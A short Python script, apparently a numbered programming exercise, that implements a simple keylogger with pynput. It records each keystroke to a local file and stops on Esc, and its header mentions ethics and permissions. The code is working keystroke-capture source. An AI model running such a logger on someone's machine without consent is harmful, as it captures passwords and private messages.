'''
Task # 04
Simple Keylogger
Create a basic keylogger program that records and logs keystrokes. 
Focus on logging the keys pressed and saving them to a file. 
Note: Ethical considerations and permissions are crucial for 
projects involving keyloggers.
'''

from pynput import keyboard

# File to log keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as f:
            if key == key.space:
                f.write(' ')
            elif key == key.enter:
                f.write('\n')
            else:
                f.write(f'[{key.name}]')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
